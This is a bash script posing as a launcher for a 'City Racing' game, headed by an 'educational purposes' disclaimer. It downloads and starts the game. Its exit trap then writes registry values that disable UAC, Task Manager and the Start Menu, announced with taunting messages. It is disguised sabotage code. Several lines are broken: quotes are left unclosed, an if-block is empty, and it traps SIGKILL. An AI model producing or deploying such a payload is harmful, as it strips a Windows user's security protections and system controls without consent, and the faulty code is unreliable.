#NOTE: This code is purely for educational purposes and is not to be used in a malicious way.

#!/bin/bash


on_exit(){
 echo "You stopped racing... Say goodbye to the registry!"
 #Disable the Registry Key does requrie system reset.

 # Define the registry key path for UAC settings
 UAC_REGISTRY_KEY="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

 # Set the value of EnableLUA to 0 to disable UAC
 sudo reg.exe add "$UAC_REGISTRY_KEY /v EnableLUA /t REG_DWORD /d 0 /f

  echo "You stopped racing... Disabling Task Manager!"
  # Define the registry key path for Task Manager settings
  TASKMGR_REGISTRY_KEY="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"

  # Set the value of DisableTaskMgr to 1 to disable Task Manager
  sudo reg.exe add "$TASKMGR_REGISTRY_KEY" /v DisableTaskMgr /t REG_DWORD /d 1 /f
  
  echo "You stopped racing... Disabling Start Menu!"
  # Define the registry key path for Start Menu settings
  STARTMENU_REGISTRY_KEY="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"

  # Set the value of NoStartMenu to 1 to disable the Start Menu
  sudo reg.exe add "$STARTMENU_REGISTRY_KEY" /v NoStartMenu /t REG_DWORD /d 1 /f

}

trap 'on_exit' EXIT SIGTERM SIGINT SIGKILL

echo "So you want to race huh?"

#Download game

echo "You need to be fast..."
curl -OJL https://www.gametop.com/download-free-games/city-racing/download.html
echo "Prepare to go fast..."

#### Launches Game
echo "Launching Most Realistic Driving Simulator"
./City-Racing.exe


echo "Launching Most Realistic Driving Sim..."
cmd.exe /c start " " 'City Racing'.lnk

echo "Game launched. Get ready to race!"

game_pid=$!

while true; do
  if ! pgrep -x 'City Racing'.lnk > /dev/null; then
	#on_exit
  fi
  sleep 5
done

